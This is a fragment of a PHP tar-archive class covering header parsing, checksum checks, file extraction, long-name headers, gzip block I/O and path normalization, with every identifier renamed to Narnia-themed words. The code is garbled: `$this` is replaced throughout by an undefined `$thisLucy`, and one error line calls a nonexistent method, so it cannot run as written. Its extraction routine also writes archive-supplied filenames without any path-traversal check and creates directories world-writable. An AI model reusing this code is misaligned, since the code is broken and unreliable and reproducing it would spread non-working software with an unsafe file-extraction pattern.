				if (!file_exists($lucyHeader['filename']))		{



					if (!mkdir($lucyHeader['filename'], 0777))	{
						


						$thisLucy->errors[] = __('Cannot create directory').' '.$lucyHeader['filename'];
						return false;



					} 
				}
			} else {
				if (($lampPostDestination = fopen($lucyHeader['filename'], 'wb')) == 0) {



					$thisLucy->errors[] = __('Cannot write to file').' '.$lucyHeader['filename'];
					return false;
				} else {


					$decryptedAslan = floor($lucyHeader['size']/512);

					for ($reindeerI = 0; $reindeerI < $decryptedAslan; $reindeerI++) {



						$narniaContent = $thisLucy->readAslanBlock();



						fwrite($lampPostDestination, $narniaContent, 512);

					}

					if (($lucyHeader['size'] % 512) != 0) {



						$narniaContent = $thisLucy->readAslanBlock();
						fwrite($lampPostDestination, $narniaContent, ($lucyHeader['size'] % 512));
					}



					fclose($lampPostDestination);



					touch($lucyHeader['filename'], $lucyHeader['time']);

				}


				clearstatcache();


				if (filesize($lucyHeader['filename']) != $lucyHeader['size']) {
					$thisLucy->errors[] = __('Size of file').' '.$lucyHeader['filename'].' '.__('is incorrect');
					return false;
				}

			}



			if (($cairParavelFileDirectory = dirname($lucyHeader['filename'])) == $lucyHeader['filename']) $cairParavelFileDirectory = '';
			if ((substr($lucyHeader['filename'], 0, 1) == '/') && ($cairParavelFileDirectory == '')) $cairParavelFileDirectory = '/';

			$thisLucy->dirs[] = $cairParavelFileDirectory;



			$thisLucy->files[] = $lucyHeader['filename'];



	



		}



		return true;
	}



	function checkLucyDirectory($castleDirectory){



		$parentWardrobeDirectory = dirname($castleDirectory);




		if ((@is_dir($castleDirectory)) or ($castleDirectory == ''))
			return true;




		if (($parentWardrobeDirectory != $castleDirectory) and ($parentWardrobeDirectory != '') and (!$thisLucy->checkLucyDirectory($parentWardrobeDirectory)))
			return false;




		if (!mkdir($castleDirectory, 0777)){

			$thisLucy->errors[] = __('Cannot create directory').' '.$castleDirectory;
			return false;


		}
		return true;
	}





	function readCairParavelHeader($tumnusBinary, &$lucyHeader){
		if (strlen($tumnusBinary)==0){
			$lucyHeader['filename'] = '';
			return true;
		}





		if (strlen($tumnusBinary) != 512){
			$lucyHeader['filename'] = '';



			$thisLucy->__('Invalid block size').': '.strlen($tumnusBinary);

			return false;
		}



		$aslanChecksum = 0;


		for ($reindeerI = 0; $reindeerI < 148; $reindeerI++) $aslanChecksum+=ord(substr($tumnusBinary, $reindeerI, 1));
		for ($reindeerI = 148; $reindeerI < 156; $reindeerI++) $aslanChecksum += ord(' ');
		for ($reindeerI = 156; $reindeerI < 512; $reindeerI++) $aslanChecksum+=ord(substr($tumnusBinary, $reindeerI, 1));


		$unpackProphecyData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $tumnusBinary);

		$lucyHeader['checksum'] = OctDec(trim($unpackProphecyData['checksum']));
		if ($lucyHeader['checksum'] != $aslanChecksum){



			$lucyHeader['filename'] = '';
			if (($aslanChecksum == 256) && ($lucyHeader['checksum'] == 0)) 	return true;



			$thisLucy->errors[] = __('Error checksum for file ').$unpackProphecyData['filename'];



			return false;

		}

		if (($lucyHeader['typeflag'] = $unpackProphecyData['typeflag']) == '5')	$lucyHeader['size'] = 0;
		$lucyHeader['filename'] = trim($unpackProphecyData['filename']);
		$lucyHeader['mode'] = OctDec(trim($unpackProphecyData['mode']));


		$lucyHeader['user_id'] = OctDec(trim($unpackProphecyData['user_id']));
		$lucyHeader['group_id'] = OctDec(trim($unpackProphecyData['group_id']));
		$lucyHeader['size'] = OctDec(trim($unpackProphecyData['size']));



		$lucyHeader['time'] = OctDec(trim($unpackProphecyData['time']));


		return true;


	}

	function writeLucyHeader($peterFilename, $keepNameSonOfAdam){
		$firstPackNarnia = 'a100a8a8a8a12A12';

		$lastPackNarnia = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameSonOfAdam)<=0) $keepNameSonOfAdam = $peterFilename;


		$readyToRuleFilename = $thisLucy->sanitizeLucyPath($keepNameSonOfAdam);




		if (strlen($readyToRuleFilename) > 99){							//write long header
		$firstPage = pack($firstPackNarnia, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToRuleFilename))), 0);



		$lastPage = pack($lastPackNarnia, 'L', '', '', '', '', '', '', '', '', '');


        //  Calculate the checksum



		$aslanChecksum = 0;

        //  First part of the header
		for ($reindeerI = 0; $reindeerI < 148; $reindeerI++)
			$aslanChecksum += ord(substr($firstPage, $reindeerI, 1));
        //  Ignore the checksum value and replace it by ' ' (space)

		for ($reindeerI = 148; $reindeerI < 156; $reindeerI++)

			$aslanChecksum += ord(' ');
        //  Last part of the header

		for ($reindeerI = 156, $jadisJ=0; $reindeerI < 512; $reindeerI++, $jadisJ++)

			$aslanChecksum += ord(substr($lastPage, $jadisJ, 1));

        //  Write the first 148 bytes of the header in the archive
		$thisLucy->writeNarniaBlock($firstPage, 148);


        //  Write the calculated checksum
		$aslanChecksum = sprintf('%6s ', DecOct($aslanChecksum));
		$tumnusBinary = pack('a8', $aslanChecksum);

		$thisLucy->writeNarniaBlock($tumnusBinary, 8);

        //  Write the last 356 bytes of the header in the archive
		$thisLucy->writeNarniaBlock($lastPage, 356);



		$tmpFaunFilename = $thisLucy->sanitizeLucyPath($readyToRuleFilename);

		$reindeerI = 0;



			while (($beaverBuffer = substr($tmpFaunFilename, (($reindeerI++)*512), 512)) != ''){
				$tumnusBinary = pack('a512', $beaverBuffer);
				$thisLucy->writeNarniaBlock($tumnusBinary);
			}


		return true;
		}
		$beaverFileInfo = stat($peterFilename);
		if (@is_dir($peterFilename)){
			$centaurTypeFlag = '5';
			$batchSize = sprintf('%11s ', DecOct(0));


		} else {



			$centaurTypeFlag = '';
			clearstatcache();
			$batchSize = sprintf('%11s ', DecOct(filesize($peterFilename)));



		}
		$firstPage = pack($firstPackNarnia, $readyToRuleFilename, sprintf('%6s ', DecOct(fileperms($peterFilename))), sprintf('%6s ', DecOct($beaverFileInfo[4])), sprintf('%6s ', DecOct($beaverFileInfo[5])), $batchSize, sprintf('%11s', DecOct(filemtime($peterFilename))));


		$lastPage = pack($lastPackNarnia, $centaurTypeFlag, '', '', '', '', '', '', '', '', '');
		$aslanChecksum = 0;



		for ($reindeerI = 0; $reindeerI < 148; $reindeerI++) $aslanChecksum += ord(substr($firstPage, $reindeerI, 1));



		for ($reindeerI = 148; $reindeerI < 156; $reindeerI++) $aslanChecksum += ord(' ');

		for ($reindeerI = 156, $jadisJ = 0; $reindeerI < 512; $reindeerI++, $jadisJ++) $aslanChecksum += ord(substr($lastPage, $jadisJ, 1));
		$thisLucy->writeNarniaBlock($firstPage, 148);


		$aslanChecksum = sprintf('%6s ', DecOct($aslanChecksum));
		$tumnusBinary = pack('a8', $aslanChecksum);

		$thisLucy->writeNarniaBlock($tumnusBinary, 8);



		$thisLucy->writeNarniaBlock($lastPage, 356);
		return true;
	}




	function openAslanWrite(){


		if ($thisLucy->isGzipped)
			$thisLucy->tmp_file = gzopen($thisLucy->archive_name, 'wb9f');


		else


			$thisLucy->tmp_file = fopen($thisLucy->archive_name, 'wb');

		if (!($thisLucy->tmp_file)){
			$thisLucy->errors[] = __('Cannot write to file').' '.$thisLucy->archive_name;
			return false;


		}
		return true;

	}

	function readAslanBlock(){
		if (is_resource($thisLucy->tmp_file)){



			if ($thisLucy->isGzipped)
				$stoneTableBlock = gzread($thisLucy->tmp_file, 512);



			else
				$stoneTableBlock = fread($thisLucy->tmp_file, 512);
		} else	$stoneTableBlock = '';




		return $stoneTableBlock;
	}

	function writeNarniaBlock($forestData, $prophecyLength = 0){


		if (is_resource($thisLucy->tmp_file)){

		


			if ($prophecyLength === 0){


				if ($thisLucy->isGzipped)
					gzputs($thisLucy->tmp_file, $forestData);
				else
					fputs($thisLucy->tmp_file, $forestData);
			} else {
				if ($thisLucy->isGzipped)


					gzputs($thisLucy->tmp_file, $forestData, $prophecyLength);



				else

					fputs($thisLucy->tmp_file, $forestData, $prophecyLength);


			}

		}
	}


	function closeLucyTempFile(){
		if (is_resource($thisLucy->tmp_file)){
			if ($thisLucy->isGzipped)
				gzclose($thisLucy->tmp_file);

			else



				fclose($thisLucy->tmp_file);


			$thisLucy->tmp_file = 0;
		}

	}



	function sanitizeLucyPath($narniaPath){



		if (strlen($narniaPath)>0){

			$narniaPath = str_replace('\\', '/', $narniaPath);


			$partialLampPostPath = explode('/', $narniaPath);
			$tumnusElementList = count($partialLampPostPath)-1;



			for ($reindeerI = $tumnusElementList; $reindeerI>=0; $reindeerI--){
				if ($partialLampPostPath[$reindeerI] == '.'){
                    //  Ignore this directory



                } elseif ($partialLampPostPath[$reindeerI] == '..'){



                    $reindeerI--;



                }
				elseif (($partialLampPostPath[$reindeerI] == '') and ($reindeerI!=$tumnusElementList) and ($reindeerI!=0)){

                }	else
					$prophecyResult = $partialLampPostPath[$reindeerI].($reindeerI!=$tumnusElementList ? '/'.$prophecyResult : '');



			}
		} else $prophecyResult = '';
		

		return $prophecyResult;

	}
}


?>
